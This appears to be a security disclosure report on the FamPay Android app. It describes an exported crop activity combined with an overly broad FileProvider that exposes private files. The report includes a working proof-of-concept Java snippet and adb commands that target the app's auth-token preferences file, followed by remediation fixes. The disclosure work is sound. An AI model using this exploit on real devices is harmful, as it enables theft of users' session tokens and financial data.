Executive Summary (Non-Technical)

FamPay includes a photo cropping feature (CropImageActivity) that is incorrectly marked as accessible to any app on the device. Combined with a misconfigured file-sharing setting that grants access to the entire app's private storage, any malicious app can read FamPay's internal files — including the SQLite database, saved login tokens, and configuration files.

Imagine FamPay accidentally left its vault door open and labeled it with a "welcome" sign. Any other app on the user's phone can walk in and take documents — the SQLite database (transaction history, linked accounts), session tokens, and app configuration.

Exposed Files (High Value Targets)

/data/data/com.fampay.in/databases/
SQLite: transaction history, linked bank accounts, beneficiaries
/data/data/com.fampay.in/shared_prefs/
XML: auth tokens, refresh tokens, device binding keys, user ID
/data/data/com.fampay.in/files/
Cached responses, Firebase tokens, any persisted app state
/data/data/com.fampay.in/cache/
Network cache, image cache, may contain API responses with PII

Root Cause

1. CropImageActivity exported with no restrictions

<!-- AndroidManifest.xml line ~906 -->
<activity
  android:name="com.theartofdev.edmodo.cropper.CropImageActivity"
  android:exported="true"   <!-- any app can start this -->
  android:theme="@style/Base.Theme.AppCompat" />

2. FileProvider root-path exposes everything

<!-- res/xml/file_paths.xml -->
<paths>
  <root-path name="root" path="." />  <!-- exposes "/" — entire filesystem -->
  <files-path name="files" path="." />
  <cache-path name="cache" path="." />
</paths>

3. CropImageActivity passes result Intent without stripping URI

// CropImageActivity.java
intent.putExtras(getIntent());        // copies attacker-controlled extras
setResult(i3, intent);                // returns them to caller
finish();

Attack Chain

1
Malicious app starts CropImageActivity
Sends Intent with CROP_IMAGE_EXTRA_SOURCE pointing to a FamPay content:// URI for any internal file
2
FamPay FileProvider grants read access
Because root-path path="." covers the entire private data directory, the URI is valid
3
CropImageActivity reads the file, returns result
Activity processes the file as an "image to crop" — but the malicious app intercepts the onActivityResult
4
Malicious app reads file bytes via returned URI
Full content of SharedPreferences XML (auth tokens) or SQLite DB is now in the attacker's hands

ADB Proof of Concept

Step 1 — Build malicious APK (attacker device)
// AttackerActivity.java
Intent i = new Intent();
i.setComponent(new ComponentName(
    "com.fampay.in",
    "com.theartofdev.edmodo.cropper.CropImageActivity"
));
// Request FamPay's SharedPreferences (auth tokens)
Uri fileUri = Uri.parse(
    "content://com.fampay.in.provider/root/data/data/com.fampay.in/shared_prefs/fampay_prefs.xml"
);
i.putExtra("CROP_IMAGE_EXTRA_SOURCE", fileUri);
i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
startActivityForResult(i, 1337);
Step 2 — ADB Validation Command
adb shell am start -n com.fampay.in/.CropImageActivity \
  --es CROP_IMAGE_EXTRA_SOURCE \
  "content://com.fampay.in.provider/root/data/data/com.fampay.in/shared_prefs/fampay_prefs.xml"
Step 3 — List SharedPrefs files
adb shell run-as com.fampay.in ls -la shared_prefs/
# Or if device is rooted:
adb shell ls /data/data/com.fampay.in/shared_prefs/

Remediation

Fix 1 — Remove exported=true from CropImageActivity

<activity
  android:name="com.theartofdev.edmodo.cropper.CropImageActivity"
  android:exported="false"  <!-- Only internal app can start this -->
  android:theme="@style/Base.Theme.AppCompat" />

Fix 2 — Restrict FileProvider to specific subdirectories

<!-- Replace root-path with specific paths -->
<paths>
  <!-- REMOVE: <root-path name="root" path="." /> -->
  <files-path name="images" path="images/" />     <!-- only images -->
  <cache-path name="img_cache" path="images/" />  <!-- only image cache -->
</paths>

Fix 3 — Update android-image-cropper library

The vulnerable version of com.theartofdev.edmodo:android-image-cropper is unmaintained. Replace with com.vanniktech:android-image-cropper which is the maintained fork and has this issue resolved.
